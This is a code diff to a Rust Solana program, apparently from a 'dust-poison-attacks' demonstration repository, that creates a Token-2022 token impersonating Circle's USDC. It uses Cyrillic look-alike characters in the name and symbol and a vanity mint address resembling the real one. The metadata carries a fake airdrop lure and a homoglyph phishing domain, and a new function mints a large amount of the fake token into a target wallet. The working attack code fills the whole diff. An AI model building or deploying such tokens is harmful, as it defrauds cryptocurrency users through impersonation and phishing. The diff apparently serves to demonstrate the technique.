@@ -1,13 +1,18 @@
 use solana_client::rpc_client::RpcClient;
 use solana_sdk::{
-    commitment_config::CommitmentConfig, native_token::LAMPORTS_PER_SOL, pubkey::Pubkey,
-    signature::Keypair, signer::Signer, system_instruction, transaction::Transaction,
+    commitment_config::CommitmentConfig, instruction::Instruction, native_token::LAMPORTS_PER_SOL,
+    pubkey::Pubkey, signature::Keypair, signer::Signer, system_instruction,
+    transaction::Transaction,
+};
+use spl_associated_token_account::{
+    get_associated_token_address_with_program_id, instruction::create_associated_token_account,
 };
 use spl_token_2022::{
     extension::{
         metadata_pointer::MetadataPointer, BaseStateWithExtensions, ExtensionType,
         StateWithExtensions,
     },
+    instruction::mint_to,
     state::Mint,
 };
 use spl_token_metadata_interface::state::TokenMetadata;
@@ -15,21 +20,24 @@ use spl_type_length_value::variable_len_pack::VariableLenPack;
 
 fn main() {
     let mint_authority = Keypair::new();
+
     // Example of a vanity keypair bytes with first 4 characters similar to Circle's USDC.
     let mint_bytes = [
-        135u8, 233, 127, 125, 122, 65, 254, 148, 167, 241, 26, 39, 252, 62, 91, 53, 139, 99, 216,
-        152, 22, 36, 19, 42, 90, 207, 14, 37, 135, 182, 74, 56, 198, 250, 121, 101, 194, 24, 53,
-        192, 135, 97, 161, 90, 0, 251, 255, 121, 119, 194, 110, 180, 40, 15, 243, 48, 159, 126, 90,
-        150, 244, 150, 7, 111,
+        8, 94, 195, 201, 247, 160, 162, 74, 4, 173, 46, 105, 211, 244, 26, 73, 202, 135, 156, 152,
+        46, 152, 254, 215, 9, 145, 74, 249, 150, 225, 245, 124, 198, 250, 122, 228, 100, 232, 158,
+        15, 186, 1, 147, 78, 124, 35, 213, 81, 170, 78, 191, 249, 234, 247, 224, 130, 67, 232, 169,
+        40, 172, 174, 66, 252,
     ];
     let mint_account = Keypair::from_bytes(&mint_bytes).unwrap();
+
+    println!("MINT AUTHORITY: {}", mint_authority.pubkey());
     println!("MINT ACCOUNT: {}", mint_account.pubkey());
 
     let client = RpcClient::new("https://api.devnet.solana.com".to_string());
 
     let name = "UЅDС (USDC)";
     let symbol = "UЅDС";
-    let uri = "https://www.centre.io/"; //Valid URI
+    let uri = "https://raw.githubusercontent.com/448-OG/dust-poison-attacks/refs/heads/master/token-metadata/metadata.json";
 
     let mut metadata = TokenMetadata {
         mint: mint_account.pubkey(),
@@ -100,13 +108,13 @@ fn main() {
         &spl_token_2022::id(),
         &mint_account.pubkey(),
         &mint_authority.pubkey(),
-        spl_token_metadata_interface::state::Field::Key("Circle USDC is doing an airdrop for it's users. 
+        spl_token_metadata_interface::state::Field::Key("Circle USDC is doing an airdrop for it's users.
         Spend $25 or more to get a $500 airdrop as Circle prepares to go public with an initial public offering.
-        Visit https://center.xyz for more info.".into()), // A URL similar to Circle's https://www.centre.io/ but is a phishing site
-        "Only $2,456 worth of USDC left.".into(), // A call-to-action :(
+        Visit https://сircle.io for more info.".into()),
+        "Only $600 worth of USDC left.".into(),
     );
 
-    check_request_airdrop(&client, &mint_authority.pubkey(), 2);
+    // check_request_airdrop(&client, &mint_authority.pubkey(), 2);
 
     let recent_blockhash = client.get_latest_blockhash().unwrap();
     let tx = Transaction::new_signed_with_payer(
@@ -129,6 +137,47 @@ fn main() {
         .unwrap();
 
     read_metadata(&client, &mint_account.pubkey());
+
+    mint_to_op(&client, &mint_authority, &mint_account.pubkey());
+}
+
+fn mint_to_op(client: &RpcClient, funding_address: &Keypair, mint_pubkey: &Pubkey) {
+    // CCwwo3crfXLCzCnQQyE8oQaXPbz1FnVKA7a33HtbK1YX as the example for destination of target account
+    let wallet_address = Pubkey::from_str_const("CCwwo3crfXLCzCnQQyE8oQaXPbz1FnVKA7a33HtbK1YX");
+    let destination_ata = get_associated_token_address_with_program_id(
+        &wallet_address,
+        mint_pubkey,
+        &spl_token_2022::id(),
+    );
+    let source_account = create_associated_token_account(
+        &funding_address.pubkey(),
+        &wallet_address,
+        mint_pubkey,
+        &spl_token_2022::id(),
+    );
+    let mint_to_instr = mint_to(
+        &spl_token_2022::ID,
+        mint_pubkey,
+        &destination_ata,
+        &funding_address.pubkey(),
+        &[&funding_address.pubkey()],
+        10_386_321_75_000_000,
+    )
+    .unwrap();
+
+    let recent_blockhash = client.get_latest_blockhash().unwrap();
+    let tx = Transaction::new_signed_with_payer(
+        &[source_account, mint_to_instr],
+        Some(&funding_address.pubkey()),
+        &[&funding_address],
+        recent_blockhash,
+    );
+    dbg!(client
+        .send_and_confirm_transaction_with_spinner_and_commitment(
+            &tx,
+            CommitmentConfig::finalized(),
+        )
+        .unwrap());
 }
 
 fn read_metadata(client: &RpcClient, pubkey: &Pubkey) {
